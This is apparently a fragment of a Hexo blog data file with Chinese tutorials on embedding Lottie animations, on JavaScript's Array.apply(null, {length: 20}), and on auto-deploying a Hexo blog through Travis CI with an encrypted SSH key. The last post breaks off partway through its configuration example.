概述\n由于前端工程师不熟悉ae，动画师不熟悉前端知识，第一次可能不知道怎么整合，这里做个简单介绍。简言之就是用ae的插件[Bodymovin](https://www.adobeexchange.com/creativecloud.details.12557.html)导出动画的json数据，然后用[Lottie](http://airbnb.io/lottie/#/README)动画库在页面中调用。[源代码](https://github.com/jovysun/WOW)\n![动画示例图](2.gif)\n<!-- more -->\n\n# 详述\n\n## Bodymovin安装\n1. 方法一在Adobe插件中心下载安装[Bodymovin](https://www.adobeexchange.com/creativecloud.details.12557.html)\n2. 方法二直接下载源文件[bodymovin.zxp](https://github.com/airbnb/lottie-web/tree/master/build/extension)用[ZXP Installer](https://aescripts.com/learn/zxp-installer/)安装。\n\n详细步骤请参考[https://www.cnblogs.com/zamhown/p/6688369.html](https://www.cnblogs.com/zamhown/p/6688369.html)\n\n## web页面使用\n```html\n<div class=\"stage\"></div>\n<script src=\"lottie.min.js\"></script>\n<script>\nvar stage = document.querySelector('.stage');\nvar anim = lottie.loadAnimation({\n    container: stage,   //包含动画的DOM元素\n    renderer: 'svg',  // 'svg' / 'canvas' / 'html'\n    loop: false, //true / false / number\n    autoplay: true, //true / false\n    path: 'loading.json',   //动画的路径\n});\nanim.addEventListener('complete', function(){\n    console.log('complete:' + Date.now());\n    anim.destroy();\n})\n</script>\n```\n\n## 查看\n如果直接本地打开，应该看不了，会提示如下错误：\n![错误示例图](1.jpg)\n因此需要本地简单起个http服务才能查看，可以简单装个http-server。\n\n## 其他 \nlottie也支持Android, iOS, React Native, and Windows端使用，具体请移步[官方文档](http://airbnb.io/lottie/#/README)。\n","slug":"2019-04-12-ae-lottie-demo","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xd005nwovvb0eylhr1","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>由于前端工程师不熟悉ae，动画师不熟悉前端知识，第一次可能不知道怎么整合，这里做个简单介绍。简言之就是用ae的插件<a href=\"https://www.adobeexchange.com/creativecloud.details.12557.html\" target=\"_blank\" rel=\"noopener\">Bodymovin</a>导出动画的json数据，然后用<a href=\"http://airbnb.io/lottie/#/README\" target=\"_blank\" rel=\"noopener\">Lottie</a>动画库在页面中调用。<a href=\"https://github.com/jovysun/WOW\" target=\"_blank\" rel=\"noopener\">源代码</a><br><img src=\"/2019-04-12-ae-lottie-demo/2.gif\" alt=\"动画示例图\"><br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"Bodymovin安装\"><a href=\"#Bodymovin安装\" class=\"headerlink\" title=\"Bodymovin安装\"></a>Bodymovin安装</h2><ol>\n<li>方法一在Adobe插件中心下载安装<a href=\"https://www.adobeexchange.com/creativecloud.details.12557.html\" target=\"_blank\" rel=\"noopener\">Bodymovin</a></li>\n<li>方法二直接下载源文件<a href=\"https://github.com/airbnb/lottie-web/tree/master/build/extension\" target=\"_blank\" rel=\"noopener\">bodymovin.zxp</a>用<a href=\"https://aescripts.com/learn/zxp-installer/\" target=\"_blank\" rel=\"noopener\">ZXP Installer</a>安装。</li>\n</ol>\n<p>详细步骤请参考<a href=\"https://www.cnblogs.com/zamhown/p/6688369.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/zamhown/p/6688369.html</a></p>\n<h2 id=\"web页面使用\"><a href=\"#web页面使用\" class=\"headerlink\" title=\"web页面使用\"></a>web页面使用</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"stage\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"lottie.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">var</span> stage = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'.stage'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">var</span> anim = lottie.loadAnimation(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    container: stage,   <span class=\"comment\">//包含动画的DOM元素</span></span></span><br><span class=\"line\"><span class=\"javascript\">    renderer: <span class=\"string\">'svg'</span>,  <span class=\"comment\">// 'svg' / 'canvas' / 'html'</span></span></span><br><span class=\"line\"><span class=\"javascript\">    loop: <span class=\"literal\">false</span>, <span class=\"comment\">//true / false / number</span></span></span><br><span class=\"line\"><span class=\"javascript\">    autoplay: <span class=\"literal\">true</span>, <span class=\"comment\">//true / false</span></span></span><br><span class=\"line\"><span class=\"javascript\">    path: <span class=\"string\">'loading.json'</span>,   <span class=\"comment\">//动画的路径</span></span></span><br><span class=\"line\"><span class=\"undefined\">&#125;);</span></span><br><span class=\"line\"><span class=\"javascript\">anim.addEventListener(<span class=\"string\">'complete'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'complete:'</span> + <span class=\"built_in\">Date</span>.now());</span></span><br><span class=\"line\"><span class=\"undefined\">    anim.destroy();</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;)</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"查看\"><a href=\"#查看\" class=\"headerlink\" title=\"查看\"></a>查看</h2><p>如果直接本地打开，应该看不了，会提示如下错误：<br><img src=\"/2019-04-12-ae-lottie-demo/1.jpg\" alt=\"错误示例图\"><br>因此需要本地简单起个http服务才能查看，可以简单装个http-server。</p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>lottie也支持Android, iOS, React Native, and Windows端使用，具体请移步<a href=\"http://airbnb.io/lottie/#/README\" target=\"_blank\" rel=\"noopener\">官方文档</a>。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>由于前端工程师不熟悉ae，动画师不熟悉前端知识，第一次可能不知道怎么整合，这里做个简单介绍。简言之就是用ae的插件<a href=\"https://www.adobeexchange.com/creativecloud.details.12557.html\" target=\"_blank\" rel=\"noopener\">Bodymovin</a>导出动画的json数据，然后用<a href=\"http://airbnb.io/lottie/#/README\" target=\"_blank\" rel=\"noopener\">Lottie</a>动画库在页面中调用。<a href=\"https://github.com/jovysun/WOW\" target=\"_blank\" rel=\"noopener\">源代码</a><br><img src=\"/2019-04-12-ae-lottie-demo/2.gif\" alt=\"动画示例图\"><br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"Bodymovin安装\"><a href=\"#Bodymovin安装\" class=\"headerlink\" title=\"Bodymovin安装\"></a>Bodymovin安装</h2><ol>\n<li>方法一在Adobe插件中心下载安装<a href=\"https://www.adobeexchange.com/creativecloud.details.12557.html\" target=\"_blank\" rel=\"noopener\">Bodymovin</a></li>\n<li>方法二直接下载源文件<a href=\"https://github.com/airbnb/lottie-web/tree/master/build/extension\" target=\"_blank\" rel=\"noopener\">bodymovin.zxp</a>用<a href=\"https://aescripts.com/learn/zxp-installer/\" target=\"_blank\" rel=\"noopener\">ZXP Installer</a>安装。</li>\n</ol>\n<p>详细步骤请参考<a href=\"https://www.cnblogs.com/zamhown/p/6688369.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/zamhown/p/6688369.html</a></p>\n<h2 id=\"web页面使用\"><a href=\"#web页面使用\" class=\"headerlink\" title=\"web页面使用\"></a>web页面使用</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"stage\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"lottie.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">var</span> stage = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'.stage'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">var</span> anim = lottie.loadAnimation(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    container: stage,   <span class=\"comment\">//包含动画的DOM元素</span></span></span><br><span class=\"line\"><span class=\"javascript\">    renderer: <span class=\"string\">'svg'</span>,  <span class=\"comment\">// 'svg' / 'canvas' / 'html'</span></span></span><br><span class=\"line\"><span class=\"javascript\">    loop: <span class=\"literal\">false</span>, <span class=\"comment\">//true / false / number</span></span></span><br><span class=\"line\"><span class=\"javascript\">    autoplay: <span class=\"literal\">true</span>, <span class=\"comment\">//true / false</span></span></span><br><span class=\"line\"><span class=\"javascript\">    path: <span class=\"string\">'loading.json'</span>,   <span class=\"comment\">//动画的路径</span></span></span><br><span class=\"line\"><span class=\"undefined\">&#125;);</span></span><br><span class=\"line\"><span class=\"javascript\">anim.addEventListener(<span class=\"string\">'complete'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'complete:'</span> + <span class=\"built_in\">Date</span>.now());</span></span><br><span class=\"line\"><span class=\"undefined\">    anim.destroy();</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;)</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"查看\"><a href=\"#查看\" class=\"headerlink\" title=\"查看\"></a>查看</h2><p>如果直接本地打开，应该看不了，会提示如下错误：<br><img src=\"/2019-04-12-ae-lottie-demo/1.jpg\" alt=\"错误示例图\"><br>因此需要本地简单起个http服务才能查看，可以简单装个http-server。</p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>lottie也支持Android, iOS, React Native, and Windows端使用，具体请移步<a href=\"http://airbnb.io/lottie/#/README\" target=\"_blank\" rel=\"noopener\">官方文档</a>。</p>"},{"title":"深入理解Array.apply(null, {length: 20})","date":"2019-04-17T12:38:21.000Z","updated":"2019-04-17T12:38:21.000Z","_content":"\n# 概述\n学习Vue[渲染函数](https://cn.vuejs.org/v2/guide/render-function.html)章节，有段说明是用渲染函数渲染20个相同的段落：\n```js\nrender: function (createElement) {\n  return createElement('div',\n    Array.apply(null, { length: 20 }).map(function () {\n      return createElement('p', 'hi')\n    })\n  )\n}\n```\n对于`Array.apply(null, { length: 20 })`的用法有些费解，于是查资料研究了下。\n<!-- more -->\n\n# 详述\n\n## 核心知识点\n1. 构造函数也可以像普通函数一样调用，`Array(1, 2, 3)`结果为`[1, 2, 3]`；\n2. apply方法的第一个参数为null或者undefined等价于全局对象（非严格模式）；\n3. apply方法的第二个参数`{ length: 20 }`为类数组；\n4. 浏览器环境下等价于`window.Array(undefined, undefined, undefined, ...)`。\n\n## 深究apply\napply()方法调用一个具有给定this值的函数，以及作为一个数组（或类似数组对象）提供的参数。\n\n语法为`func.apply(thisArg, [argsArray])`。\n\nthisArg：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动替换为指向全局对象。浏览器环境下，这个值为null、undefined和window是等价的，测试结果如下：\n\n![示例图](3.jpg)\n\nargsArray：一个数组或者类数组对象，这里是类数组，关于类数组，[MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply)有这样一段描述：\n\n> 从 ECMAScript 第5版开始，可以使用任何种类的类数组对象，就是说只要有一个 length 属性和(0..length-1)范围的整数属性。例如现在可以使用 NodeList 或一个自己定义的类似 {'length': 2, '0': 'eat', '1': 'bananas'} 形式的对象。\n\n测试结果如下：\n\n![示例图](4.jpg)\n\n## `Array.apply(null, { length: 20 })`与`Array(20)`\n两者的测试结果如下：\n\n![示例图一](1.jpg)\n\n从结果可以看出前者是声明了一个长度为20的数组，并且初始化每个值为`undefined`；后者只是声明了一个长度为20的数组，值为`empty`，等价于`new Array(20)`。\n\n而[map()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map)方法是针对数组中的每个**元素**进行迭代执行函数，最终返回一个新的数组，既然后者没有元素，map也就无意义了，测试结果如下：\n\n![示例图二](2.jpg)","source":"_posts/2019/04/2019-04-17-Array-apply-null-length-20.md","raw":"---\ntitle: '深入理解Array.apply(null, {length: 20})'\ntags:\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-04-17 20:38:21\nupdated: 2019-04-17 20:38:21\n---\n\n# 概述\n学习Vue[渲染函数](https://cn.vuejs.org/v2/guide/render-function.html)章节，有段说明是用渲染函数渲染20个相同的段落：\n```js\nrender: function (createElement) {\n  return createElement('div',\n    Array.apply(null, { length: 20 }).map(function () {\n      return createElement('p', 'hi')\n    })\n  )\n}\n```\n对于`Array.apply(null, { length: 20 })`的用法有些费解，于是查资料研究了下。\n<!-- more -->\n\n# 详述\n\n## 核心知识点\n1. 构造函数也可以像普通函数一样调用，`Array(1, 2, 3)`结果为`[1, 2, 3]`；\n2. apply方法的第一个参数为null或者undefined等价于全局对象（非严格模式）；\n3. apply方法的第二个参数`{ length: 20 }`为类数组；\n4. 浏览器环境下等价于`window.Array(undefined, undefined, undefined, ...)`。\n\n## 深究apply\napply()方法调用一个具有给定this值的函数，以及作为一个数组（或类似数组对象）提供的参数。\n\n语法为`func.apply(thisArg, [argsArray])`。\n\nthisArg：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动替换为指向全局对象。浏览器环境下，这个值为null、undefined和window是等价的，测试结果如下：\n\n![示例图](3.jpg)\n\nargsArray：一个数组或者类数组对象，这里是类数组，关于类数组，[MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply)有这样一段描述：\n\n> 从 ECMAScript 第5版开始，可以使用任何种类的类数组对象，就是说只要有一个 length 属性和(0..length-1)范围的整数属性。例如现在可以使用 NodeList 或一个自己定义的类似 {'length': 2, '0': 'eat', '1': 'bananas'} 形式的对象。\n\n测试结果如下：\n\n![示例图](4.jpg)\n\n## `Array.apply(null, { length: 20 })`与`Array(20)`\n两者的测试结果如下：\n\n![示例图一](1.jpg)\n\n从结果可以看出前者是声明了一个长度为20的数组，并且初始化每个值为`undefined`；后者只是声明了一个长度为20的数组，值为`empty`，等价于`new Array(20)`。\n\n而[map()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map)方法是针对数组中的每个**元素**进行迭代执行函数，最终返回一个新的数组，既然后者没有元素，map也就无意义了，测试结果如下：\n\n![示例图二](2.jpg)","slug":"2019-04-17-Array-apply-null-length-20","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xd005qwovv9rn4xvpe","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>学习Vue<a href=\"https://cn.vuejs.org/v2/guide/render-function.html\" target=\"_blank\" rel=\"noopener\">渲染函数</a>章节，有段说明是用渲染函数渲染20个相同的段落：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">render: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">createElement</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> createElement(<span class=\"string\">'div'</span>,</span><br><span class=\"line\">    <span class=\"built_in\">Array</span>.apply(<span class=\"literal\">null</span>, &#123; <span class=\"attr\">length</span>: <span class=\"number\">20</span> &#125;).map(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> createElement(<span class=\"string\">'p'</span>, <span class=\"string\">'hi'</span>)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>对于<code>Array.apply(null, { length: 20 })</code>的用法有些费解，于是查资料研究了下。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"核心知识点\"><a href=\"#核心知识点\" class=\"headerlink\" title=\"核心知识点\"></a>核心知识点</h2><ol>\n<li>构造函数也可以像普通函数一样调用，<code>Array(1, 2, 3)</code>结果为<code>[1, 2, 3]</code>；</li>\n<li>apply方法的第一个参数为null或者undefined等价于全局对象（非严格模式）；</li>\n<li>apply方法的第二个参数<code>{ length: 20 }</code>为类数组；</li>\n<li>浏览器环境下等价于<code>window.Array(undefined, undefined, undefined, ...)</code>。</li>\n</ol>\n<h2 id=\"深究apply\"><a href=\"#深究apply\" class=\"headerlink\" title=\"深究apply\"></a>深究apply</h2><p>apply()方法调用一个具有给定this值的函数，以及作为一个数组（或类似数组对象）提供的参数。</p>\n<p>语法为<code>func.apply(thisArg, [argsArray])</code>。</p>\n<p>thisArg：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动替换为指向全局对象。浏览器环境下，这个值为null、undefined和window是等价的，测试结果如下：</p>\n<p><img src=\"/2019-04-17-Array-apply-null-length-20/3.jpg\" alt=\"示例图\"></p>\n<p>argsArray：一个数组或者类数组对象，这里是类数组，关于类数组，<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply\" target=\"_blank\" rel=\"noopener\">MDN</a>有这样一段描述：</p>\n<blockquote>\n<p>从 ECMAScript 第5版开始，可以使用任何种类的类数组对象，就是说只要有一个 length 属性和(0..length-1)范围的整数属性。例如现在可以使用 NodeList 或一个自己定义的类似 {‘length’: 2, ‘0’: ‘eat’, ‘1’: ‘bananas’} 形式的对象。</p>\n</blockquote>\n<p>测试结果如下：</p>\n<p><img src=\"/2019-04-17-Array-apply-null-length-20/4.jpg\" alt=\"示例图\"></p>\n<h2 id=\"Array-apply-null-length-20-与Array-20\"><a href=\"#Array-apply-null-length-20-与Array-20\" class=\"headerlink\" title=\"Array.apply(null, { length: 20 })与Array(20)\"></a><code>Array.apply(null, { length: 20 })</code>与<code>Array(20)</code></h2><p>两者的测试结果如下：</p>\n<p><img src=\"/2019-04-17-Array-apply-null-length-20/1.jpg\" alt=\"示例图一\"></p>\n<p>从结果可以看出前者是声明了一个长度为20的数组，并且初始化每个值为<code>undefined</code>；后者只是声明了一个长度为20的数组，值为<code>empty</code>，等价于<code>new Array(20)</code>。</p>\n<p>而<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map\" target=\"_blank\" rel=\"noopener\">map()</a>方法是针对数组中的每个<strong>元素</strong>进行迭代执行函数，最终返回一个新的数组，既然后者没有元素，map也就无意义了，测试结果如下：</p>\n<p><img src=\"/2019-04-17-Array-apply-null-length-20/2.jpg\" alt=\"示例图二\"></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>学习Vue<a href=\"https://cn.vuejs.org/v2/guide/render-function.html\" target=\"_blank\" rel=\"noopener\">渲染函数</a>章节，有段说明是用渲染函数渲染20个相同的段落：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">render: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">createElement</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> createElement(<span class=\"string\">'div'</span>,</span><br><span class=\"line\">    <span class=\"built_in\">Array</span>.apply(<span class=\"literal\">null</span>, &#123; <span class=\"attr\">length</span>: <span class=\"number\">20</span> &#125;).map(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> createElement(<span class=\"string\">'p'</span>, <span class=\"string\">'hi'</span>)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>对于<code>Array.apply(null, { length: 20 })</code>的用法有些费解，于是查资料研究了下。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"核心知识点\"><a href=\"#核心知识点\" class=\"headerlink\" title=\"核心知识点\"></a>核心知识点</h2><ol>\n<li>构造函数也可以像普通函数一样调用，<code>Array(1, 2, 3)</code>结果为<code>[1, 2, 3]</code>；</li>\n<li>apply方法的第一个参数为null或者undefined等价于全局对象（非严格模式）；</li>\n<li>apply方法的第二个参数<code>{ length: 20 }</code>为类数组；</li>\n<li>浏览器环境下等价于<code>window.Array(undefined, undefined, undefined, ...)</code>。</li>\n</ol>\n<h2 id=\"深究apply\"><a href=\"#深究apply\" class=\"headerlink\" title=\"深究apply\"></a>深究apply</h2><p>apply()方法调用一个具有给定this值的函数，以及作为一个数组（或类似数组对象）提供的参数。</p>\n<p>语法为<code>func.apply(thisArg, [argsArray])</code>。</p>\n<p>thisArg：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动替换为指向全局对象。浏览器环境下，这个值为null、undefined和window是等价的，测试结果如下：</p>\n<p><img src=\"/2019-04-17-Array-apply-null-length-20/3.jpg\" alt=\"示例图\"></p>\n<p>argsArray：一个数组或者类数组对象，这里是类数组，关于类数组，<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply\" target=\"_blank\" rel=\"noopener\">MDN</a>有这样一段描述：</p>\n<blockquote>\n<p>从 ECMAScript 第5版开始，可以使用任何种类的类数组对象，就是说只要有一个 length 属性和(0..length-1)范围的整数属性。例如现在可以使用 NodeList 或一个自己定义的类似 {‘length’: 2, ‘0’: ‘eat’, ‘1’: ‘bananas’} 形式的对象。</p>\n</blockquote>\n<p>测试结果如下：</p>\n<p><img src=\"/2019-04-17-Array-apply-null-length-20/4.jpg\" alt=\"示例图\"></p>\n<h2 id=\"Array-apply-null-length-20-与Array-20\"><a href=\"#Array-apply-null-length-20-与Array-20\" class=\"headerlink\" title=\"Array.apply(null, { length: 20 })与Array(20)\"></a><code>Array.apply(null, { length: 20 })</code>与<code>Array(20)</code></h2><p>两者的测试结果如下：</p>\n<p><img src=\"/2019-04-17-Array-apply-null-length-20/1.jpg\" alt=\"示例图一\"></p>\n<p>从结果可以看出前者是声明了一个长度为20的数组，并且初始化每个值为<code>undefined</code>；后者只是声明了一个长度为20的数组，值为<code>empty</code>，等价于<code>new Array(20)</code>。</p>\n<p>而<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map\" target=\"_blank\" rel=\"noopener\">map()</a>方法是针对数组中的每个<strong>元素</strong>进行迭代执行函数，最终返回一个新的数组，既然后者没有元素，map也就无意义了，测试结果如下：</p>\n<p><img src=\"/2019-04-17-Array-apply-null-length-20/2.jpg\" alt=\"示例图二\"></p>"},{"title":"Travis CI实现hexo博客自动部署","date":"2019-04-18T09:55:02.000Z","updated":"2019-04-18T09:55:02.000Z","_content":"# 前言\n此篇默认读者已经使用过hexo写过几篇博文，并且已经创建好SSH key。\n\n# 概述\nhexo写博客，为了多端同步我们会切个开发分支，每次写完都要提交代码，同时还得部署，文章多了，等待部署时间较长。能不能提交后自动部署呢？\n<!-- more -->\n\n# 详述\nTravis CI 是一个持续集成(Continuous integration，简称CI)的工具。它可以在公共的 Github 仓库上免费使用。\n\n1. [Travis CI](https://travis-ci.org)注册账号，可以github账号授权登录；\n2. 根目录创建`travis.yml`和`.travis`文件夹；\n3. 安装travis（macOS系统为例）并登录；\n    ```shell\n    $ sudo gem install travis\n    $ travis login --auto\n    ```\n4. 加密私钥\n    ```shell\n    $ travis encrypt-file ~/.ssh/id_rsa --add\n    ```\n    会在当前目录生成`id_rsa.enc`文件，并且`.travis.yml`文件中自动生成如下代码：\n    ```\n    before_install:\n    - openssl aes-256-cbc -K $encrypted_830d3b21a25d_key -iv $encrypted_830d3b21a25d_iv\n      -in ~/.ssh/id_rsa.enc -out ~/.ssh/id_rsa -d\n    ```\n5. 在`.travis`文件夹下创建ssh_config文件，并添加代码如下：\n    ```\n    Host github.com\n        User git\n        StrictHostKeyChecking no\n        IdentityFile ~/.ssh/id_rsa\n        IdentitiesOnly yes\n    ```\n6. 进入Travis CI网站设置页面，打开我们要集成的库，示例如下：\n    ![示例图](1.png)\n\n7. 配置`.travis.yml`文件，示例如下：\n\n    ```yml\n    # 配置语言及相应版本\n    language: node_js\n\n    node_js:\n      - \"10\"\n\n    #项目所在分支\n    # branches:\n    #   only:\n    #   - master\n\n    # 缓存\n    cache:\n      directories:\n        - node_modules\n\n    before_install:\n    - openssl aes-256-cbc -K $encrypted_eced380b421a_key -iv $encrypted_eced380b421a_iv\n      -in id_rsa.enc -out ~/.ssh/id_rsa -d\n    # 改变文件权限\n    - chmod 600 ~/.ssh/id_rsa \n    # 配置 ssh\n    - eval $(ssh-agent)\n    - ssh-add ~/.ssh/id_rsa\n    - cp .travis/ssh_config ~/.ssh/config\n    # 配置 git 替换为自己的信息\n    - git config --global user.name 'jovysun'\n    - git config --global user.email jovy_sun@163.com\n\n\n    # 安装依赖\n    install:\n    - npm install hexo-cli -g\n    - npm install\n\n    # 部署的命令\n    script:\n    - npm run deploy  # hexo clean && hexo g -d\n\n    ```\n8. 打开package.json文件添加hexo部署命令，示例如下：\n    ```json\n      \"scripts\": {\n        \"deploy\": \"hexo clean && hexo g -d\"\n      }\n    ```\n\n这样每次提交完代码，就会自动触发Travis CI的自动集成即自动部署。\n# 参考\nhttps://segmentfault.com/a/1190000004667156","source":"_posts/2019/04/2019-04-18-travis-hexo.md","raw":"---\ntitle: Travis CI实现hexo博客自动部署\ntags:\n  - github\n  - hexo\n  - 工具\ncategories:\n  - 其他\ndate: 2019-04-18 17:55:02\nupdated: 2019-04-18 17:55:02\n---\n# 前言\n此篇默认读者已经使用过hexo写过几篇博文，并且已经创建好SSH key。\n\n# 概述\nhexo写博客，为了多端同步我们会切个开发分支，每次写完都要提交代码，同时还得部署，文章多了，等待部署时间较长。能不能提交后自动部署呢？\n<!-- more -->\n\n# 详述\nTravis CI 是一个持续集成(Continuous integration，简称CI)的工具。它可以在公共的 Github 仓库上免费使用。\n\n1. [Travis CI](https://travis-ci.org)注册账号，可以github账号授权登录；\n2. 根目录创建`travis.yml`和`.travis`文件夹；\n3. 安装travis（macOS系统为例）并登录；\n    ```shell\n    $ sudo gem install travis\n    $ travis login --auto\n    ```\n4. 加密私钥\n    ```shell\n    $ travis encrypt-file ~/.ssh/id_rsa --add\n    ```\n    会在当前目录生成`id_rsa.enc`文件，并且`.travis.yml`文件中自动生成如下代码：\n    ```\n    before_install:\n    - openssl aes-256-cbc -K $encrypted_830d3b21a25d_key -iv $encrypted_830d3b21a25d_iv\n      -in ~/.ssh/id_rsa.enc -out ~/.ssh/id_rsa -d\n    ```\n5. 在`.travis`文件夹下创建ssh_config文件，并添加代码如下：\n    ```\n    Host github.com\n        User git\n        StrictHostKeyChecking no\n        IdentityFile ~/.ssh/id_rsa\n        IdentitiesOnly yes\n    ```\n6. 进入Travis CI网站设置页面，打开我们要集成的库，示例如下：\n    ![示例图](1.png)\n\n7. 配置`.travis.yml`文件，示例如下：\n\n    ```yml\n    # 配置语言及相应版本\n    language: node_js\n\n    node_js:\n      - \"10\"\n\n    #项目所在分支\n    # branches:\n    #   only:\n    #   - master\n\n    # 